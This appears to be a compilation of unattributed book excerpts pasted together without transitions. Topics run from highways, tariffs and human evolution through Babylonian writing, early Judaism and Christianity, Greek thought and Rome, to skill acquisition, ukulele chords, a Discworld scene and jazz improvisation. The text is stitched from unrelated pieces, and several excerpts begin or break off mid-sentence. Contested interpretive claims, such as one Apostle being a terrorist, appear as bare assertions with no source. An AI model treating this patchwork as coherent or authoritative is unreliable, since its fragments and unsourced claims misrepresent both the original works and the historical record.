In the mid 1950s, the Federal government started building the interstate highway system, a twentieth-century marvel of pork-barrel public-works politics. With memories of wartime transportation shortages, military leaders made certain that the interstate system could handle tanks, military convoys, and troop carriers. Today, few think of interstate highways as a military system, though they’re just as capable of sending tanks across the country as trucks.

The real work isn’t laying wires, it’s agreeing to link isolated communities together. It’s figuring out who’s going to pay for the maintenance and improvements. It’s forging alliances between groups that don’t trust each other.”

Indeed, there are many current geostates or states in confederated geostates which lack minimum wage, but which nevertheless have workers who are, on average, paid as well as in comparable states.

Similar arguments could be made regarding, for example, a system that explicitly finds women inferior. One suspects such a system would, it goes without saying, have trouble attracting many women. Many polls of modern geostates that ask men and women about anti-woman laws regularly find that men and women hold divergent opinions(11). That is, if the choice of home “country” were wide open, sexist societies would have a lot of trouble holding on to women.

When a nation raises a tariff on a good, it is essentially protecting one group of people (those who work with the good or in related areas) at the expense of another group (everyone else). For example, if China wishes to sell cheap tires to Americans, a high tariff on tires protects tire people, but removes the benefit to everyone else of cheap tires.

A final consequence of bipedalism was that females could only give birth to relatively small-brained offspring–because mothers needed relatively narrow pelvises to be able to walk efficiently. From this it followed that the infants would be dependent on their mothers for a considerable period, which in turn stimulated the division of labour between males and females, males being required to bring back food for their mates and offspring.

Nina Jablonski and George Chaplin, of the California Academy of Sciences, have suggested that the real reason humans became bipedal was as a way to appear bigger and more threatening in contests with other animals, and in so doing avoid punishing conflicts and gain access to food. The idea behind this is taken from observations of gorilla and chimpanzee behaviour in the wild. Both types of ape stand upright, swagger, wave their arms about and beat their chests when threatening others in contests over food or sexual partners.

palaeontologists recognise two important ways in which early hominid stone tools differ from the tools produced by other primates. The first is that some of the stone tools were produced to manufacture other tools–such as flakes to sharpen a stick. And second, the early hominids needed to be able to ‘see’ that a certain type of tool could be ‘extracted’ from a certain type of rough rock lying around.

Nicholas Toth of Indiana University spent many hours trying to teach a very bright bonobo (a form of pygmy chimpanzee), called Kanzi, to make stone tools. Kanzi did manage it, but not in the typical human fashion, by striking one stone against another. Instead, Kanzi would hurl the stones against the concrete floor of his cage. He just didn’t possess the mental equipment to ‘see’ the tool ‘inside’ the stone.

C. K. Brain advanced the idea that it was man’s control of fire which helped convert him from being the prey of the big cats to being a predator–fire offered protection that earlier man lacked. And in Spain there is evidence of the use of fire as a way to corral elephants into a bog, where they were butchered. Later, keeping a fire alive continuously would have encouraged social organisation.

A second–and more controversial–climatic explanation is that the eruption of the Mount Toba volcano at 71,000 years ago led to a worldwide volcanic winter, lasting ten thousand years and drastically reducing both the human and animal population. This would have been followed by a period of severe competition for resources, resulting in rapid development among very disparate groups, fuelling innovation.

Randall White, professor of anthropology at New York University, adds the intriguing thought that these figures date from a time (and such a time must surely have existed) when early man had yet to make the link between sexual intercourse and birth. At that time, birth would have been truly miraculous, and early man may have thought that, in order to give birth, women received some spirit, say from animals (hence the animal heads). Until the link was made between sexual intercourse and birth, woman would have seemed mysterious and miraculous creatures, far more so than men.

The figures were adorned with, respectively, 2,936, 4,903 and 5,274 beads plus, in the case of the adult, a beaded cap with fox teeth and twenty-five mammoth-ivory bracelets. Each bead, according to experiments White carried out, would have taken between an hour and three hours to produce–13,000–39,000 hours in total (somewhere between eighteen and fifty-four months). So the word ‘decoration’ hardly applies and we need to ask whether these beads are evidence of something more important–social distinctions, maybe, or even primitive religion.

White certainly thinks social divisions were already in existence 28,000 years ago; for one thing, it is unlikely that at Sungir everyone was buried with thousands of beads that took so long to make–there would hardly have been time for real work. It is possible, therefore, that the people who were buried with beads were themselves religious figures of some kind. The differences in decoration between individuals also imply that early humans were acquiring a sense of ‘self’.

there is a general agreement among palaeobiologists that domestication was invented only once and then spread to western Europe and India. Whether it also spread as far afield as south-east Asia and central Africa is still a moot point, and the most recent genetic evidence of farmers (as opposed to their plants) is not as conclusive as it might be. It shows that modern-day Greeks share 85–100 per cent of their (relevant) genes with Middle Easterners (from Baghdad, Ankara and Damascus), whereas Parisians share only 15–30 per cent.

It is also an even more interesting question than it looks when you consider the fact that the hunter-gathering mode is actually quite an efficient way of leading one’s life. Ethnographic evidence among hunter-gatherer tribes still in existence shows that they typically need to ‘work’ only three or four or five hours a day in order to provide for themselves and their kin.

It was sedentism which allowed the interval between births to be reduced, boosting population, as a result of which villages grew, social organisation became more complicated and, perhaps, a new concept of religion was invented, which in some ways reflected the village situation, where leaders and subordinates would have emerged. Once these changes were set in train, domesticated plants at least would have developed almost unconsciously as people ‘selected’ wild cereals which were amenable to this new lifestyle.

In the same way, money weakened traditional ties and that, in time, had profound political implications. Work and human labour became a commodity, with a coin-related value attached, and therefore time too could be measured in the same way.

Woolley also discovered a practice that royalty in Babylon was not buried alone. Alongside the king and queen, in one chamber, lay a company of soldiers (copper helmets and spears were found next to their bones) and in another chamber were the skeletons of nine ladies of the court, still wearing their elaborate headdresses. Now these were very grisly practices, and quite important enough in themselves, for what they revealed about ancient beliefs. But what particularly attracted Woolley’s attention was that no text had ever hinted at this collective burial. He therefore drew the conclusion that the interment had taken place before writing had been invented to record the event.

Yet this development would have raised anxiety levels: citizens had to rely on others, not their kin, for essentials.

The achievements of these cities and city-states were astonishing and endured for some twenty-six centuries, with a remarkable number of innovations being introduced which created much of the world as we know it and live it. It was in Babylonia that music, medicine and mathematics were developed, where the first libraries were created, the first maps drawn, where chemistry, botany and zoology were conceived. At least, we assume that is so. Babylon is the home of so many ‘firsts’ because it is also the place where writing was invented and therefore we know about Babylon in a way that we do not know history before then.

these early urban areas were usually divided into three. There was an inner city with its own walls, inside which were found the temples of the city’s gods, plus the palace of the ruler/administrator/religious leader and a number of private houses. The suburbs consisted of much smaller houses, communal gardens and cattle pens, providing day-to-day produce and support for the citizens. Finally, there was a commercial centre. Though called the ‘harbour’, this area was where overland commerce was handled and where foreign as well as native merchants lived.

Personal identification was a problem and a necessity from the moment that economic organisation went beyond the extended family, where everyone knew each other and property was owned communally. Certain names would have been easy, ‘Lionheart’ say.39 But how would one render an abstract name, such as ‘Loved-by-God’? Pictographs would have been developed, much as the heart shape, , has come to mean ‘love’ in our time. In this way, multiple meanings overlapped: the sun, , for example, might mean ‘day’, ‘bright’, or ‘white’, while a star, , might mean ‘god’ or ‘sky’, depending on context. The ‘doctrine of the name’ was important in Babylon, where thought worked mainly by analogy, rather than by inductive or deductive processes as we use in the modern world.

Trade was still the main reason for writing but it was now that its use was extended to religion, politics and history/myth–the beginnings of imaginative literature. Such a transformation didn’t happen overnight. In the early schools for scribes, we find lexical lists–lists of words–and lists of proverbs. This is probably how they were taught to write, and it was through well-known proverbs and incantations, even magic spells, that abstract signs for syntactical and grammatical elements became established (the proverbs had a simple, familiar form). And it was in this way that writing changed from being a purely symbolic system of information-recording and exchange, to a representation of speech.

Lists made possible new kinds of intellectual activity. They encouraged comparison and criticism. The items in a list were removed from the context that gave them meaning in the oral world and in that sense became abstractions.

The very first idea, apart from economic tablets and proper names, that we can decipher among the earliest writing is that of the battle between ‘kings’ and ‘priests’. At one stage it was believed that all of a city’s inhabitants and all of its land ‘belonged’ to the supreme city god and that the high priest or priestess administered the city on behalf of this deity, but such a view is no longer tenable: land holding was much more complex than this. The high priest or priestess was known as the en, or ensi. Normally, and to begin with, the en or ensi was the most powerful figure, but there was another, the lugal–literally speaking, the ‘great man’. He was in effect the military commander, the fortress commander, who ran the city in its disputes with foreign powers. It does not take much imagination to envisage conflict between these two sources of power.

There was in the first place a number of stories that prefigured narratives which appeared later in the Bible. Given the influence of that book, its origins are important. For example, Sargon, king of Akkad, emerged from complete obscurity to become ‘king of the world’. His ancestry was elaborated from popular tales, which tell of his mother, a priestess, concealing the fact that she had given birth to him by placing him in a wicker basket, sealed with bitumen, and casting him adrift on a river. He was later found by a water drawer who brought Sargon up as his adopted son. Sargon first became a gardener…and then king. The parallels with the Moses story are plain.

Skill acquisition requires practicing the skill in question. It requires significant periods of sustained, focused concentration. It requires creativity, flexibility, and the freedom to set your own standard of success. Unfortunately, most modern methods of education and credentialing require simple compliance. The primary (but unstated) goal isn’t to acquire useful skills, it’s to certify completion of a mostly arbitrary set of criteria, established by standards committees far removed from the student, for the purpose of validating certain qualities some third party appears to care about.

I also recommend precommitting to completing at least twenty hours of practice. Once you start, you must keep practicing until you hit the twenty-hour mark. If you get stuck, keep pushing: you can’t stop until you reach your target performance level or invest twenty hours. If you’re not willing to invest at least twenty hours up front, choose another skill to acquire. The reason for this is simple: the early parts of the skill acquisition process usually feel harder than they really are. You’re often confused, and you’ll run into unexpected problems and barriers. Instead of giving up when you experience the slightest difficulty, precommitting to twenty hours makes it easier to persist.

There are many places to find chord charts: pretty much every ukulele book contains a set of chord diagrams. What makes Mike’s chart unique is that it’s organized by frequency of use. Common chords, like the chords featured in the “Four Chord Song,” are listed first. Rare chords, like G#SUS4, are listed at the bottom, since you’ll rarely see them used. This type of frequency analysis is very, very useful: the power law applies to music as well. To be able to play songs, you don’t need to know hundreds of chords.

Analysis of early religions can seem at times like numerology. There are so many of them, and they are so varied, that they can be made to fit any theory. Nevertheless, insofar as the world’s religions can be reduced to core elements, then those elements are: a belief in the Great Goddess, in the Bull, in the main sky gods (the sun and the moon), in sacred stones, in the efficacy of sacrifice, in an afterlife, and in a soul of some sort which survives death and inhabits a blessed spot. These elements describe many religions in some of the less developed parts of the world even today.

until a relatively late period of Jewish history the Israelites had a ‘considerable’ number of divinities. ‘According to the number of thy cities are thy gods, O Judah,’ says the prophet Jeremiah, writing in the sixth century BC.59 When Israelite religion first appears, in the Hebrew scriptures, we find no fewer than three main forms of worship. There is the worship of teraphim or family gods, the worship of sacred stones, and the worship of certain great gods, partly native, partly perhaps borrowed. Some of these gods take the form of animals, others of sky gods, the sun in particular. There are many biblical references to these gods. For example, when Jacob flees from Laban, we hear how Rachel stole her father’s teraphim: when the furious chieftain finally catches up with the fugitives, one of his first questions is to ask why they stole his domestic gods.60 Hosea refers to teraphim as ‘stocks of wood’, while Zechariah dismisses them as ‘idols that speak lies to the people’.61 It is clear that the teraphim were preserved in each household with reverential care, that they were sacrificed to by the family at stated intervals, and that they were consulted on all occasions of doubt or difficulty by ‘a domestic priest “clad in an ephod”. In all this the Israelites were little different from the surrounding peoples.’

Stone-worship also played an important part in the primitive Semitic religion. For the early Hebrews a sacred stone was a ‘Beth-el’, a place where gods dwelt.63 In the legend of Jacob’s dream we get an example where the sacred stone is anointed and a promise is made to it of a tenth of the speaker’s substance as an offering. In other places women pray to phallic-shaped stones so that they might be blessed with children.64 Yahweh is referred to as a rock in Deuteronomy, and in the second book of Samuel.

The prophets’ main concern was Israel’s internal spirituality. Their aim was to turn Yahweh-worship away from idolatry (the idol in the ark), so that the faithful would reflect instead on their own behaviour, their feelings and failings. This concentration on the inner life suggests that the prophets were concerned with an urban religion, that they were faced with the problem of living together in close proximity. This may explain why, in their efforts to shock the Israelites into improving their morality, the prophets built up the idea of revelation.

Like the Buddha, like Plato and like Aristotle, he looked beyond the gods, and taught that the answer to an ethical life lies within man himself, that universal order and harmony can only be achieved if people show a wider sense of community and obligation than their own and their family’s self-interest.130 He thought that scholarship and learning were the surest way to harmony and order and that the natural aristocrats in the sort of society he wanted were the sages.

the Greeks left us far more than any other comparable group. Their legacy is the greatest the world has yet known.4 There are two principal aspects to that legacy. One is that the Greeks were the first to truly understand that the world may be known, that knowledge can be acquired by systematic observation, without aid from the gods, that there is an order to the world and the universe which goes beyond the myths of our ancestors. And second, that there is a difference between nature–which operates according to invariable laws–and the affairs of men, which have no such order, but where order is imposed or agreed and can take various forms and is mutable.

This gap opened up because land in Attica was poor, certainly so far as growing grain was concerned. Therefore, in bad years the poorer farmers had to borrow from their richer neighbours. With the invention of coins, however, instead of borrowing a sack of corn in the old way, to be repaid by a sack, the farmer now borrowed the price of a sack. But this sack was bought when corn was scarce–and therefore relatively expensive–and was generally repaid in times of plenty, in other words when corn was cheap. This caused debt to grow and in Attica the law allowed for creditors to seize an insolvent debtor and take him and his family into slavery. This ‘rich man’s law’ was bad enough, but the spread of writing, when the laws were set down, under the supervision of Dracon, made it worse, encouraging people to enforce their written rights. ‘Draconian law’, it was said, was written in blood.

Second, the Ionians were a seafaring people, interposed between East and West, with strong trading links. Mercantile exchange is always the principal force in the exchange of ideas, which often stem from the solving of practical problems–navigation, means of transport, water supply, handicraft techniques.

the Greek philosopher/scientists enjoyed much less patronage than their contemporaries in China, who were employed by the emperor, and often charged with looking after the calendar, which was a state concern. This had the effect of making Chinese scientists much more circumspect in their views, and in embracing new concepts: they had much more to lose than in Greece, and they seldom argued as the Greeks argued.

Thales was not the first ancient figure to speculate about the origin and nature of the universe but he was the first ‘who expressed his ideas in logical and not mythological terms’.23 As a merchant who had travelled to Egypt, he had picked up enough mathematics and Babylonian astronomy to be able to predict a total eclipse of the sun in the year 585 BC, which duly occurred, on the day we call 29 May.

Thales is more often remembered for the basic scientific-philosophical question that he asked: what is the world made of ? The answer he gave–water–was wrong, but the very act of asking so fundamental a question was itself an innovation. His answer was also new because it implied that the world consists not of many things (as it so obviously does) but, underneath it all, of one thing. In other words, the universe is not only rational, and therefore knowable, but also simple.

Place names in the Bible are Iron Age names, the Philistines (Palestinians) are not mentioned in other, extra-biblical texts, until around 1200 BC, and domesticated camels, though mentioned in the Bible as early as chapter 24 of Genesis, were not brought under human control until the end of the second millennium BC.21

It is worth noting, once more, how different the Hebrew scriptures were from Greek literature, produced at more or less the same time. In particular, the Tanakh was narrow in outlook. As Robin Lane Fox has observed, there is no detailed concern with politics, or with the great forces–economic, scientific, even geographic–that shape the world. Certain comparisons highlight this difference. For example, the Song of Deborah in the Old Testament is, like Aeschylus’ The Persians, an examination of the impact of defeat in war on the enemy’s royal women. The Hebrew scriptures are a victory ode, they gloat over the changed circumstances of the women with the words: ‘So let all thine enemies perish, O Lord.’ In contrast, Aeschylus’ tragedy shows sympathy for the women: the gods may have fought on the side of Greece but that doesn’t stop their enemies being treated as full human beings in their own right.

An even bigger gulf existed between the history of Herodotus and Thucydides and the Hebrew scriptures. Herodotus does allow for miracles and Thucydides sees ‘the hand of fate’ behind events; however, whereas the Greeks researched their books, visited actual sites and interrogated eyewitnesses where they could, and whereas they regarded men as responsible for their actions, in both victory and defeat and, in Thucydides’ case certainly, allowed little or no role for the gods, the Hebrew Bible is almost the exact opposite. The writings are anonymous, they show no signs of research–no one has travelled to see anything for themselves, or made any attempt to compare the Hebrew stories with outside, independent authorities.

the word ‘virgin’ was used ‘elastically’ in both Greek and Hebrew. In one sense it was used for people in their first marriage. Greek and Latin inscriptions found in the catacombs in Rome show that the word ‘virgin’ could be applied to either a wife or husband after years of marriage. Thus ‘a virgin husband’ almost certainly meant a married man who had not been married before. Another meaning of the term was applied to women who could not conceive–i.e., had not menstruated. ‘This form of virginity ended with menstruation.’

It is perfectly possible that Jesus was both a religious and a political threat–the two were by no means incompatible. If Jesus did call himself the Messiah, or even if he allowed his followers to look upon him in that way, he was automatically a political threat because of the Jewish conception of the Messiah as military hero who would lead the Jews to revolt against Rome.

After Jesus’ resurrection, and his ascension into heaven, his followers continued to worship in the Temple, expecting his return at any moment and with it their own redemption. To this end, they tried to prepare Israel, urging on their fellow Jews the changes Jesus had proposed. But this, of course, conflicted with the authority of the traditional priests and scribes and, the further they spread from Jerusalem, the more this resistance deepened, among Jews who had no direct, first-hand experience of Jesus. In turn, this caused a major shift in Christianity (a term first coined among the Jewish-Christian community at Antioch): Gentiles were less resistant to the message of the apostles, because their traditional beliefs were less threatened.

They divided these constellations into twelve, no doubt because there were, roughly, twelve lunations in a year, and gave them names. The origins of these names are obscure but many of them were animals (perhaps reflected in the arrangement of the stars) and the practice, inherited from the Babylonians by the Greeks, gave us the zodiac, derived from the Greek word zodion, meaning ‘little animal’. Just as the twelve months of the year are each divided into, roughly, thirty days, so the twelve regions of the zodiac were divided into thirty. This division of the sky eventually gave rise to our practice of dividing the complete circle around a point into 360 degrees.3

The main problem in recording time was to reconcile the lunar cycle with the solar cycle. The sun governed the seasons–vital in agricultural societies–whereas the moon governed the tides and was an important deity, which appeared to change form in a regular rhythm. Most societies introduced extra months at certain times to overcome the discrepancy between the lunar and the solar year, but though such procedures often redressed the situation

This ‘Metonic’ cycle, as it is called, lasts for nineteen years. Each of these years lasts for twelve months but seven extra months were added, one each in the third, fifth, eighth, eleventh, thirteenth, sixteenth and nineteenth years, while some months were ‘full’ (thirty days) and others ‘deficient’ (twenty-nine days). This might seem excessively complicated but the fact that the Indians and the Chinese took over the practice shows how important it was.

the pagan philosopher Celsus, who could not understand why so many Jews had left the Law of their fathers and converted to the new religion. Celsus turned his wrath on the Messiah, pointing out that he was born in a small village, to a poor woman whose husband had divorced her after she committed adultery with a soldier. This, he remarked sarcastically, was an unlikely beginning for a god. He then went on to compare Jesus’ so-called healing powers with the ‘wizards of Egypt’, who performed similar tricks to the Messiah ‘every day in the market place for a few obols’. ‘We do not call them the Sons of God.

Celsus insisted that the universe was no more made for man than it was made for lions or dolphins, that the view among Christians that they alone had possession of divine knowledge was ludicrous, and that the ‘promise’ of salvation and bliss was a delusion. But Celsus was not only a clever polemicist–he was an able researcher too: he showed where the idea of Satan had originated, he showed that the story of Babel was a plagiarism of early Greek ideas, and he showed that heaven itself was derived from a Platonic notion. Christianity was a collection of ‘borrowed’ and intellectually bankrupt ideas.

These customs had an effect on Romans’ ideas about love, and about joint marital property, an idea that, essentially, didn’t exist. If the couple had been married before witnesses, then the husband owned everything. If the marriage resulted from usage then a wife’s property remained hers and, in the case of divorce, left with her.24 It is therefore perhaps not surprising that divorce and remarriage were common in Rome.

Captain Carrot of the Watch, who had a mind like a needle under his open, smiling face, had surreptitiously substituted a new roll of questions like: Were you nere Vortin’s Diamond Warehourse on the Nite of the 15th? and: Who was the Third Man Who did the Blagging At Bearhugger’s Distillery Larst week? and had arrested three customers before they caught on.

Martial’s first book of epigrams–some seven hundred lines long–was priced at 20 sestertii (= 5 denarii), and his thirteenth (276 lines) at 4 sestertii (= 1 denarius). To give some idea of value, Martial himself says that ‘you could get a chick-pea dinner and a woman for an as each’. Since an as was worth 1/18 of a denarius, then as John Barsby puts it, ‘You could have had forty-five chick-pea dinners plus forty-five nights of love for the price of a copy of Martial’s book of epigrams. It is a wonder he sold any copies at all.’

The inconvenience meant, too, that when one author decided to quote another, the chances were that he would rely on his memory rather than bother to unroll the relevant scroll. The copying of texts was therefore much more difficult than it sounds and it was not made easier by the fact that punctuation was rudimentary, even non-existent.

In Rome, by the end of the first century AD, education had been more or less standardised and the seven liberal arts identified. In turn, these would become the basis of medieval education, when they split into two, the more elementary trivium (grammar, rhetoric and dialectic) and the more advanced quadrivium (arithmetic, music, geometry, astronomy). As we shall see in a later chapter, this system formed the basis of modern educational systems, and was one of the elements leading to the birth of the West.

Render to Caesar the things that are Caesar’s, and to God the things that are God’s.’ Traditionally, Jesus’ answer is seen as neat footwork and that, implicitly at least, he condones the idea that the Jews pay the tax. The alternative scholarship, however, starts from the point that the gospel of St Mark is scarcely a long book, so this episode was clearly important to the author.

it casts an interesting light on a second phrase in St Mark. This is when he names one of the twelve Apostles as ‘Simon the Canaanean’. Gentiles in Rome in the first century AD would have had no idea what this was supposed to mean without elaboration. In fact, Simon was also known in Judaea as ‘Simon the Zealot’. The gospel thus covers up the fact that one of the Apostles, chosen by Jesus, was a terrorist against Rome.

Because some of Paul’s ideas threatened the credibility and authority of the Jewish-Christian disciples in Israel he was denounced and, in 59 or thereabouts, arrested and taken to Rome (because he was a Roman citizen).13 Had the revolt in 66–70 never occurred, the chances are that history would have heard nothing more of Paul. But the revolt did occur, Jerusalem and its Temple were destroyed and although vestiges of Jewish-Christianity lingered, for a century, it was never again the force it had been and eventually died out. Instead, Paul’s version survived, with the result that there was a massive change in the character of the religion. What had been a Jewish Messianic sect now became a universal salvation religion propagated in the Hellenistic world of the Mediterranean–in other words, among Gentiles.

These ideas had great appeal, the more so for the poorer slaves and labourers of the Roman empire. The reasons were obvious enough: Christianity argued that ‘suffering is noble’ and offered a better world in the future, with the Second Coming imminent. This was most attractive for people at the bottom of the ladder and it was among the urban masses, rather than the Roman aristocracy, or the upper ranks of the army, for example, that the new religion caught on.

Constantine’s decision to grant to the Christian clergy the benefit that had been granted to pagan priests–freedom from taxation and conscription in the army. A later emperor, Gratian (375–383), also freed priests from the jurisdiction of the civil courts, placing them instead under the bishops’ courts in all cases except criminal matters. Given that bishops were also allowed to receive bequests, the priesthood had become, by the fifth century, a privileged class: they were rich, they were firmly in charge of church doctrine, and they were very largely a law unto themselves.

This would have been a tricky enough calculation to do at the best of times but the early Christians made it even harder for themselves by adding a further twist.

Dating, as we have noted, had not been of prime concern to the early Christians, for two reasons. In addition to the fact that they were convinced that the Second Coming of the Messiah was imminent, they tried to stress, in Rome at least, that Christianity was an old faith, not a new one, that it had grown organically out of Judaism and was therefore much more established than the rival pagan cults. This helped them avoid the derision of critics, so they kept new dates to a minimum. But, as time went by, and the Messiah failed to appear, the liturgical calendar took on a new urgency, highlighting points in the year when the faithful could rally.

‘The medieval mind had no ego.’ Noblemen had surnames but this was less than 1 per cent of the population. Because so few inhabitants ever left the village in which they were born, there was in any case no need. Most of the villages had no name either. With violence so common it is no surprise to learn that people huddled together in communal homes, married fellow villagers and were so insular that local dialects developed which were incomprehensible to people living only a few miles away.

Caesar observed that the Germans were less civilised even than the Celts, lived in smaller communities, in landscapes less transformed by cultivation and had less highly developed religious practices. They had no permanent leaders but elected temporary chiefs for military escapades. The further north these people lived, the more extreme they were. At other times, however, they were idealised as simple, noble people, unspoiled by sophisticated lifestyles.

Justinian closed the Platonic Academy in Athens on the grounds that philosophical speculation had become an aid to heretics and an ‘inflamer’ of disputes among Christians. Many scholars headed east, first to Edessa, a Mesopotamian city housing several famous schools, then across the border with Persia to Nisibis, where the university was considered the best in Asia. This, says Richard Rubenstein, is how the Arabs inherited Aristotle and the treasures of Greek science.

As the historian Bernard Lewis has put it: ‘This, ‘Abd al-Malik seemed to be saying, was the shrine of the final dispensation–the new temple, dedicated to the religion of Abraham, replacing the Temple of Solomon, continuing the revelations vouchsafed to the Jews and Christians and correcting the errors into which they had fallen.’

He insisted on the difference between philosophy and theology and in doing so risked the ire of orthodox Muslims, because he thought theology should be made subject to the rules of philosophy, such as logic.

A trumpet player who once accepted me as student gave me a series of musical exercises to practice. Each time we met, he encouraged me to learn them more thoroughly. When I had finally developed the technical control to repeat them unerringly, he praised my efforts in a manner that seemed to say, “That’s fine and that’s what I have to teach you.” The problem was that what I had learned did not sound like jazz to me. When he first sensed my disappointment, he seemed surprised. Then he picked up his instrument and added modestly, “Well, of course, you have to throw in a little of this here and there,” To my ears, the lifeless exercises I had been practicing were transformed into a vibrant stream of imaginative variations that became progressively more ornate until I could barely recognize their relationship to the original models. This experience awakened me to my responsibility for effecting meaningful exchange between us as teacher and student.

Though aspiring artists may follow different paths initially, arriving at a commitment to jazz along direct or circuitous routes, they ultimately face the same basic challenge: to acquire the specialized knowledge upon which advanced jazz performance depends. Precisely how to pursue such knowledge is not always apparent to new enthusiasts. Traditionally, jazz musicians have learned without the kind of support provided by formal educational systems. There have been no schools or universities to teach improvisers their skills; few textbooks to aid them. Master musicians, however, did not develop their skills in a vacuum. They learned within their own professional community—the jazz community.

A player can append grace notes to the melody’s important pitches, articulating both pitches clearly, or, for variety, draw them out to produce a smear or dwa-oo effect.15 Some routinely favor the use of a single ascending chromatic grace note at the beginnings of phrases, but others use the same embellishment only sparingly or favor descending grace notes. As a matter of taste or due to idiosyncratic, physical features of performance, individual artists may consistently embellish particular pitches. Many players use an eighth-note upper mordent between a pitch and the adjacent scale degree; some tend to phrase this as a triplet, and others as an eighth note and two sixteenths. Inventive pitch substitutions, and occasional chromatic fills added between consecutive melody pitches, are also common. Additionally, soloists can rephrase the melody subtly by anticipating or delaying the entrances of phrases or by lengthening or shortening particular pitches within them.

Yet other movements are indirect, delaying resolution with a fleeting scheme of passage through different tonal centers before returning to the piece’s tonic key. When dominant chords built on scale degrees other than the fifth resolve up by a fourth to major or minor chords, for example, they create new areas of relative stability away from the tonic and perform a “tonic or resolution function.” When dominant chords move to other dominant chords, they perform a “dominant or tension function” and sustain or redirect harmonic tension to further points of resolution. In fact, transient tonalities at times may lead far away from the fundamental key without ever actually establishing a new one.

Among the most common movements found in compositions are short diatonic patterns like the ii7–V7–17 progression (in the key of C: Dm7–G7–CM7) and its components ii7–V7 and V7–17, whose root motion descends partly around the circle of fifths. Larger recurring harmonic gestures embodying comparable elements include the “I Got Rhythm” turnaround, 17–VI7–ii7–V7, and such progressions as III7–VI7–II7–V7, v7–I7–IV–IV (altered), and many others.28

Toward such ends, Rufus Reid strove to improvise a bass line to complement the pianist’s chord movements, which he anticipated on the basis of his “general knowledge of harmony.” Whenever Reid’s pitch choices clashed with the piano part, or whenever he lost his place within the progression, he would “[lay] out for a moment,” put the bass to his ear, and softly experiment with different pitches, looking perhaps for the elusive key of the bridge.

Reid then continued his bass line until stumped by another “questionable part of the progression.” Each time through the piece, he would figure out additional details that had eluded him and fix their positions within his evolving map. After initially roughing out the placement of major and minor triads, “the main pivot points of things,” Reid eventually filled in the piece’s complete form. In this regard, the first challenge he encountered in his early development was learning to distinguish aurally major and minor triads, the “big letters,” he called them at the time. Having mastered them, Reid could turn his attention to more complex structures. “I even think it took a long time before I could really understand a major-seven function [as distinct] from a dominant-seven function,” he admits.

Some musicians conceptualize the structure of a piece primarily in aural and physical terms—as a winding melodic course through successive fields of distinctive harmonic color and as a corresponding sweep of movement over an instrument’s terrain. Others find it useful to reinforce such images with notational and theoretical symbols. Before Carmen Lundy learned theory, she “always had to wait for the pianist to play the chords” so she could react to them. Now, however, visualizing the structure of a piece helps her “know where the tune is going,” and she no longer has to depend on the pianist.

Subsequently, the walker can concentrate on other things—noticing obscure details in the surroundings or thinking of unrelated matters—without becoming lost along the way. Similarly, once improvisers fix in their memories the features of a piece’s road map, they need no longer mark their changing positions within its piece’s form by consciously imaging chord symbols. Rather, they can instantaneously gauge their progress by the band’s collage of sounds and the relative positions of the sounds on their instruments. This frees their full attention for the precise details of their own parts as they move confidently, creatively, and in tempo through the piece’s harmonic course.

Recommendations about learning the structures of a piece reflect similar values. “Fake books can really stultify your development if you have the wrong attitude toward them,” Howard Levy says. “Really, the best way to learn,” he continues, is to take tunes off records, because you’re utilizing your ear. It takes a lot of know ledge and experience to be able to do this, but it becomes so easy to hear pieces in their component parts if you actually do the work yourself. Then you start trying to write the changes out by ear. In the beginning, you’re going to write out things wrong. You’re not going to know what’s right for the first few years that you do this.

The ideals and discipline embodied by these methods prepare students directly for the challenges that they face as artists. Improvisers must depend greatly upon their ears for repertory because there is frequently a lag between the introduction of new pieces to the jazz scene and their availability in printed form. In fact, much of the jazz repertory remains part of the community’s oral tradition and is not published as single sheet music items or in fake books. Moreover, musicians must be able to apprehend the unique features of each rendition as they unfold during a performance, instantly adapting their parts to those of other players. If the band takes exceptional liberties, individual players must continually alter their formal models of the piece as well. In the final analysis, a jazz piece is not a single model appearing in a fake book or on a recording. Rather, it is the precise version of a piece created by musicians at each performance event.

a young saxophonist “started watching Von Freeman play and tried to imitate his dance, the way he moved and swayed, the way he moved his horn up and down when his phrases went up and down.” By doing this, the student felt, he could play “much more” in Freeman’s manner and style, and he felt more like a “real jazz player” himself. “I was surprised at how much easier playing became when I began to move more correctly. Now, I try to imagine great jazz saxophone players before I take a solo. That’s one thing that’s made a big difference in my playing.”

Standing away from the piano, Harris initially dictates examples in a theoretical language that he has suited to jazz. Typically, he creates a phrase through the elision of a few discrete gestures. “The chord is C7,” he would alert the class. “Triplet chord up from the second with a half step below and run [a scale] down to the third with a half step between the I and the 7. Diminish up from the third, skip a note, and chromatic back to the tonic” (fig. 4.1). In response, students scramble to transpose the numbers into letters in their respective instrument’s key, then translate the letters into sounds. Musicians who have learned Barry Harris’s theoretical system become so adept at interpreting the streams of numbers Harris dictates to them for model phrases that they can perform the phrases in unison almost immediately.

In a related application, experienced artists can analyze other players’ patterns without having to transcribe them. After copying a soloist’s phrase with their instruments, they translate its finger patterns into notes that they hold in memory while envisioning the phrase’s position within its progression and determining the tonic pitch of the underlying chord. This enables them to convert the notes into numbers, identifying the phrase’s harmonic elements.

Emily Remler recalls going “through just such a frustration. I’d go to a session, not be able to express myself on guitar, and cry afterwards—I was so miserable. My technique was lousy, and my time was bad. My time was bad basically because I couldn’t get to the phrases in time.” Remler’s frustration led to an intensive practicing binge known among musicians as woodshedding. She withdrew temporarily from the jazz community and subjected herself to a musical discipline that necessarily carried over into other aspects of her lifestyle. “I played and practiced the guitar constantly, five hours a day. At one point, I went down to the Jersey shore and locked myself in a room for a month. I lost twenty pounds, stopped smoking, and became a serious guitar player. It took a lot of muscle building to reach the point where I got a really strong and full sound on the guitar. I practiced my tail off trying to play octaves and different things to build up my muscles.” After months of practice, Remler began to overcome her problems. Eventually, she developed a “reservoir of technique” that she was able to “tap” for many years.

The leader of Tommy Turrentine’s teenaged band once explained this general principle on the way home from a rehearsal by instructing Turrentine to walk with a steady pace and observe where the phrases he was carrying in his “head” fell in relation to his footsteps, noticing especially where they “came out on ‘one.’​” Stepping on the horizontal lines, which divided the sidewalk into successive units, and on the invisible lines, which halved them, Turrentine interpreted each pair of units as a measure.

he discovered that the beginnings and endings of some phrases coincided with the sidewalk’s lines, falling on the strong beats, while others fell on the invisible lines or backbeats, and in between them on the off-beats. Along with clarifying the concept of syncopation, this graphic demonstration sensitized Turrentine to each tune’s unique rhythmic counterpoint in relation both to the meter’s regular grouping of beats and to the rocking motion of its dual accentuation scheme.

